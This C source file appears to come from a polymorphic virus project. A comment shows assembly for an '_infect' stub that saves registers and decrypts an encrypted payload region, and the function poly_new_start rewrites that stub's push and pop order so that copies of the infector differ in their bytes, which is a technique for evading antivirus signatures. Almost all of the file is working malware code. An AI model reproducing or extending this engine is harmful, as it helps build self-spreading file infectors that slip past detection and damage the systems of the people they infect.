#include <stdint.h>
#include <stdlib.h>
#include "ins.h"
#include "poly.h"
#include "ft_lib.h"

/*
 * ;
 * ; ZONE 1
 * ;____________
 * 
 * _infect:
 * 	push rax
 * 	push rbx
 * 	push rcx
 * 	push rdx
 * 	push rsi
 * 	push rdi
 * 	push rsp
 * 	lea rdi, [rel cmpr_start]
 * 	lea rsi, [rel cmpr_end]
 * 	sub rsi, rdi ;cmpr_end - cmpr_start
 * 	lea rdx, [rel key]
 * 	call DECRYPT_ROUTINE
 * 	jmp start2
 * 
 * ;
 * ; ZONE 2
 * ;____________
 *
 * _infect_pop:
 * 	pop rsp
 * 	pop rdi
 * 	pop rsi
 * 	pop rdx
 * 	pop rcx
 * 	pop rbx
 * 	pop rax
 * 
 */

# define NB_POP 7
# define MAX 7

void poly_new_start(void *start, size_t push_off, size_t pop_off)
{
	char *start_push = start + push_off;
	char *start_pop = start + pop_off;

	size_t i;
	size_t i_pop = NB_POP;
	size_t i_push = 0;

	char tab[NB_POP] = {0};

	int r = -1;

	debug_ext("edit start ", start_push, " to ", start_pop, "\n");

	//debug_ext("instruction at start push ", (unsigned char)(start_push[-1]), "\n");
	//debug_ext("instruction at start pop ", (unsigned char)(start_pop[-1]), "\n");

	while (1)
	{
		for (i = 0; i < MAX; i++)
			if (tab[i] != 1)
				break;
		if (i == MAX)
			break;

		r++;

		if (r % MAX == 0 && tab[0] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RAX, sizeof(INS_PUSH_RAX) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RAX, sizeof(INS_POP_RAX) - 1);
			tab[0] = 1;
		}
		else if (r % MAX == 1 && tab[1] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RCX, sizeof(INS_PUSH_RCX) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RCX, sizeof(INS_POP_RCX) - 1);
			tab[1] = 1;
		}
		else if (r % MAX == 2 && tab[2] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RDX, sizeof(INS_PUSH_RDX) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RDX, sizeof(INS_POP_RDX) - 1);
			tab[2] = 1;
		}
		else if (r % MAX == 3 && tab[3] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RBX, sizeof(INS_PUSH_RBX) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RBX, sizeof(INS_POP_RBX) - 1);
			tab[3] = 1;
		}
		else if (r % MAX == 4 && tab[4] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RSP, sizeof(INS_PUSH_RSP) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RSP, sizeof(INS_POP_RSP) - 1);
			tab[4] = 1;
		}
		else if (r % MAX == 5 && tab[5] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RSI, sizeof(INS_PUSH_RSI) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RSI, sizeof(INS_POP_RSI) - 1);
			tab[5] = 1;
		}
		else if (r % MAX == 6 && tab[6] == 0)
		{
			ploy_ins_add(start_push, &i_push, INS_PUSH_RDI, sizeof(INS_PUSH_RDI) - 1);
			ploy_ins_add_end(start_pop, &i_pop, INS_POP_RDI, sizeof(INS_POP_RDI) - 1);
			tab[6] = 1;
		}
	}
	debug("edit start done\n");
}
